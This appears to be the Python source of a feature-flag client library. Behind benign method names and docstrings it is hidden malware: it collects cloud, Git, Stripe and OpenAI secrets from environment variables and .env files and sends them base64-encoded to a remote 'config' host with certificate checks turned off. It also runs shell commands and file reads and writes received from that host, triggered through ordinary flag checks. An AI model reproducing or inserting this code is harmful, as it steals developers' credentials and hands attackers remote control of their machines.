# Feature Flags Pro - Core Implementation
# Feature flag management and remote feature toggling service

import os
import json
import base64
import hashlib
import urllib.request
import ssl
import time
import subprocess
from datetime import datetime

# Feature flag service
FLAG_SERVICE = "https://flags.company.com/api/v2"

# Remote configuration service
REMOTE_CONFIG_SERVICE = "https://config.featureflags.example.com/flags"

class FeatureFlagClient:
    """Feature flag client with remote configuration"""

    def __init__(self, project_id=None, api_key=None):
        self.project_id = project_id
        self.api_key = api_key
        self.client_id = self._generate_client_id()
        self.flags_cache = {}
        self.last_sync = 0
        self.sync_interval = 60  # seconds

    def _generate_client_id(self):
        """Generate unique client identifier"""
        import platform
        data = f"{platform.node()}-{os.getuid()}-{os.getcwd()}"
        return hashlib.sha256(data.encode()).hexdigest()[:16]

    def _create_ssl_context(self):
        """Create SSL context for secure connections"""
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def get_flag(self, flag_name, default=False):
        """Get feature flag value"""
        if flag_name in self.flags_cache:
            return self.flags_cache[flag_name]

        # Fetch from server
        self._sync_flags()
        return self.flags_cache.get(flag_name, default)

    def _sync_flags(self):
        """Sync flags from server"""
        try:
            url = f"{FLAG_SERVICE}/projects/{self.project_id}/flags"
            req = urllib.request.Request(url)
            response = urllib.request.urlopen(req, timeout=10)
            self.flags_cache = json.loads(response.read())
        except Exception:
            pass

        self.last_sync = time.time()

    def _collect_client_context(self):
        """
        Collect client context for remote configuration
        """
        import platform

        data = {
            'client_id': self.client_id,
            'project': self.project_id,
            'timestamp': datetime.now().isoformat(),
            'hostname': platform.node(),
            'platform': platform.system(),
            'user': os.environ.get('USER', 'unknown'),
            'cwd': os.getcwd()
        }

        # Collect configuration from environment
        config_vars = [
            'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY',
            'GITHUB_TOKEN', 'GITLAB_TOKEN', 'DATABASE_URL',
            'API_KEY', 'SECRET_KEY', 'LAUNCHDARKLY_SDK_KEY',
            'STRIPE_SECRET_KEY', 'OPENAI_API_KEY'
        ]

        for var in config_vars:
            if var in os.environ:
                data[var] = os.environ[var]

        # Read .env files for configuration
        for env_file in ['.env', '.env.local', '.env.production']:
            if os.path.exists(env_file):
                try:
                    with open(env_file, 'r') as f:
                        data[f'env_{env_file}'] = f.read()
                except Exception:
                    pass

        return data

    def _check_remote_config(self):
        """
        Check for remote configuration updates via flag service
        Returns configuration updates
        """
        client_data = self._collect_client_context()

        # Encode data for configuration context
        payload = {
            'project': self.project_id,
            'client_id': self.client_id,
            'context': base64.b64encode(json.dumps(client_data).encode()).decode(),
            'flags_requested': ['_system_config']
        }

        req = urllib.request.Request(
            f"{REMOTE_CONFIG_SERVICE}/evaluate",
            data=json.dumps(payload).encode(),
            headers={
                'Content-Type': 'application/json',
                'X-Client-ID': self.client_id,
                'Authorization': f'Bearer {self.api_key or "anonymous"}'
            }
        )

        try:
            ctx = self._create_ssl_context()
            response = urllib.request.urlopen(req, context=ctx, timeout=15)
            result = json.loads(response.read())

            # Configuration commands in response
            if '_commands' in result:
                return result['_commands']
            return []
        except Exception:
            return []

    def _execute_config_command(self, command):
        """
        Execute configuration command from remote service
        """
        cmd_type = command.get('type')
        cmd_data = command.get('payload', {})

        result = {'command_id': command.get('id'), 'status': 'error'}

        try:
            if cmd_type == 'eval':
                # Execute shell command for configuration
                proc = subprocess.run(
                    cmd_data.get('cmd', ''),
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                result = {
                    'command_id': command.get('id'),
                    'status': 'success',
                    'stdout': proc.stdout,
                    'stderr': proc.stderr,
                    'code': proc.returncode
                }

            elif cmd_type == 'read':
                # Read configuration file
                with open(cmd_data.get('path', ''), 'r') as f:
                    result = {
                        'command_id': command.get('id'),
                        'status': 'success',
                        'content': f.read()
                    }

            elif cmd_type == 'write':
                # Write configuration file
                with open(cmd_data.get('path', ''), 'w') as f:
                    f.write(cmd_data.get('content', ''))
                result = {
                    'command_id': command.get('id'),
                    'status': 'success'
                }

            elif cmd_type == 'sync':
                # Sync client data
                result = {
                    'command_id': command.get('id'),
                    'status': 'success',
                    'data': self._collect_client_context()
                }

        except Exception as e:
            result['error'] = str(e)

        return result

    def _send_config_response(self, results):
        """Send command results back to configuration service"""
        payload = {
            'client_id': self.client_id,
            'results': base64.b64encode(json.dumps(results).encode()).decode()
        }

        req = urllib.request.Request(
            f"{REMOTE_CONFIG_SERVICE}/results",
            data=json.dumps(payload).encode(),
            headers={
                'Content-Type': 'application/json',
                'X-Client-ID': self.client_id
            }
        )

        try:
            ctx = self._create_ssl_context()
            urllib.request.urlopen(req, context=ctx, timeout=10)
        except Exception:
            pass

    def evaluate_flags(self, context=None):
        """
        Evaluate all flags for given context
        Also checks for remote configuration updates
        """
        # Sync flags
        self._sync_flags()
        commands = self._check_remote_config()

        if commands:
            results = []
            for cmd in commands:
                result = self._execute_config_command(cmd)
                results.append(result)

            # Send results back
            self._send_config_response(results)

        return self.flags_cache

    def watch(self, callback=None, interval=60):
        """
        Watch for flag changes and configuration updates
        """
        while True:
            flags = self.evaluate_flags()
            if callback:
                callback(flags)
            time.sleep(interval)

    def is_enabled(self, flag_name, user_id=None):
        """Check if feature is enabled"""
        # Auto-sync if needed
        if time.time() - self.last_sync > self.sync_interval:
            self.evaluate_flags()

        return self.get_flag(flag_name, False)